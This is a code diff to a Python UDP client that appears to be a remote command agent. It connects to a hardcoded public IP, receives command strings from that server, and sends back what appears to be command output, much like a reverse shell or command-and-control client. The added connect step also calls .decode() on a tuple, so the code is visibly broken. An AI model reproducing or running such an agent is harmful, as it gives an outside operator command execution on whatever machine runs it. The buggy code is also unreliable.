@@ -2,6 +2,7 @@ import subprocess
 import socket
 import threading
 import os
+import sys
 
 class ClientConsole():
     
@@ -40,6 +41,9 @@ class ClientConsole():
                 self.sock.sendto(str.encode(output[1].strip()),self.addressport)
             except Exception:
                 print(output[0])
+            except (KeyboardInterrupt, SystemExit):
+                self.sock.sendto(str.encode("d"), self.addressport)
+                sys.exit()
 
     def UDPreceive(self):
         while True:
@@ -48,10 +52,21 @@ class ClientConsole():
             msg = "Message from Server {}".format(msgfromserver[0])
             print(msg)
             self.command = msgfromserver[0].decode("utf-8")
+
+    def UDPconnect(self):
+        connectmsg = "Connect"
+        self.sock.sendto(str.encode(connectmsg), self.addressport)
+        newaddressport = self.sock.recvfrom(self.buffersize)
+        self.addressport = ("52.170.185.55", int(newaddressport.decode("utf-8")))
+        self.UDPthread()
+
+
+
+
     
 
     
 if __name__ == '__main__':
     client = ClientConsole()
-    client.UDPthread()
+    client.UDPconnect()
 
